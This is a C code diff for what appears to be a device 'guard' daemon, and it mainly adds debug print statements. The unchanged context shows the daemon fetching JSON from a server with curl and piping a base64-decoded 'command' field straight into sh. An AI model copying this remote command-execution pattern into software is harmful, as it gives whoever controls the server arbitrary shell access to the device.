@@ -254,7 +254,13 @@ load(void)
     /*
     * load info, and auto load mark
     */
-    os_callv(benv_open, benv_close, benv_load);
+    os_println("guard load 1");
+    benv_open();
+    os_println("guard load 2");
+    benv_load();
+    os_println("guard load 3");
+    benv_close();
+    os_println("guard load 4");
 }
 
 static void
@@ -706,6 +712,8 @@ do_cmd(void)
     jobj_t obj = NULL;
     int err = 0, code = 0;
 
+    os_println("guard do_cmd 1");
+    
     char cert[1+FCOOKIE_FILE_LEN] = {0};
     char  key[1+FCOOKIE_FILE_LEN] = {0};
     
@@ -714,6 +722,7 @@ do_cmd(void)
         err = -ENOEXIST; goto error;
     }
     
+    os_println("guard do_cmd 2");
     err = os_v_pgets(line, OS_LINE_LEN, 
             "curl"
                 " -d '{"
@@ -736,17 +745,22 @@ do_cmd(void)
         err = 0; goto error;
     }
     
+    os_println("guard do_cmd 3");
     obj = jobj_byjson(line);
     if (NULL==obj) {
         debug_error("bad json=%s", line);
         err = -EFAKESEVER; goto error;
     }
 
+    os_println("guard do_cmd 4");
+
     code = jcheck(obj);
     if (code) {
         debug_error("check json failed");
         err = -EFAKESEVER; goto error;
     }
+
+    os_println("guard do_cmd 5");
 
     jobj_t jsleep = jobj_get(obj, "sleep");
     if (jsleep) {
@@ -757,6 +771,8 @@ do_cmd(void)
         cmdsleep = tmpsleep;
     }
 
+    os_println("guard do_cmd 6");
+
     jobj_t jcmd = jobj_get(obj, "command");
     if (jcmd) {
         os_system("echo %s | base64 -d | sh", jobj_get_string(jcmd));
@@ -764,7 +780,10 @@ do_cmd(void)
         ok("command");
     }
 
+    os_println("guard do_cmd 7");
+
 error:
+    os_println("guard do_cmd 8");
     jobj_put(obj);
 
     put_cert(cert);
@@ -780,13 +799,21 @@ prepare(void)
     
     char *mac;
     uint32 mid, psn;
+
+    os_println("guard prepare ...");
     
     while(!ok) {
+        os_println("guard prepare load ...");
         load();
-        
+        os_println("guard prepare load ok.");
+
+        os_println("guard get mac ...");
         mac = get_mac();
+        os_println("guard get mid ...");
         mid = get_mid();
+        os_println("guard get psn ...");
         psn = get_psn();
+        os_println("guard get ok.");
         
         ok = is_good_macstring(mac) && mid && psn;
         if (!ok) {
@@ -796,6 +823,8 @@ prepare(void)
         debug_trace("load mac=%s, mid=%d, psn=%d, rt=%d, na=%d, ok=%d", 
             mac, mid, psn, get_rt(), get_na(), ok);
     }
+
+    os_println("guard prepare ok.");
 }
 
 static void
@@ -813,13 +842,20 @@ static void
 check(void)
 {
     uint32 total = 0;
-    
+
+    os_println("guard check ...");
     while(do_check()) {
         sleep(CHKSLEEP);
 
+        os_println("guard set na ...");
         set_na(get_na() + CHKSLEEP);
+        os_println("guard set na ok.");
+        
+        os_println("guard try save ...");
         try_save(CHKSLEEP);
+        os_println("guard try save ok.");
     }
+    os_println("guard check ok.");
 }
 
 static int
@@ -848,6 +884,8 @@ __init(void)
         return err;
     }
 
+    os_println("guard __init");
+    
     return 0;
 }
 
